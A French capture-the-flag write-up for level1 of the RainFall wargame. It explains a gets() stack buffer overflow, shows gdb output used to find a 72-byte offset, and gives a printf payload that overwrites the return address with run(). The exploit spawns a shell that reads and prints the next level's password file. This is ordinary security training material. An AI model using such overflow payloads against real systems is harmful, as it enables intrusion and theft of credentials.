## Le programme
Le main fait un appel vulnérable à gets en lui passant un buffer en paramètre sur lequel on a la main. Il y a également la fonction `run()` qui est compilé dans le binaire mais appelé nul part.

## La faille
L'idée est de faire un buffer overflow pour pouvoir écrire l'adresse de la fonction run() dans lequel se trouve un call system("/bin/sh")

```
(gdb) run
Starting program: /home/user/level1/level1 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

Program received signal SIGSEGV, Segmentation fault.
0x63413563 in ?? ()

```

L'adresse `0x63413563` nous donne comme information  que l'offset se fait à partir du 72ème octets.

Un offset est le nombre d'octets

## La solution 

```level1@RainFall:~$ printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x44\x84\x04\x08\n" > /tmp/level1
level1@RainFall:~$ cat /tmp/level1 - | ./level1 
Good... Wait what?
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```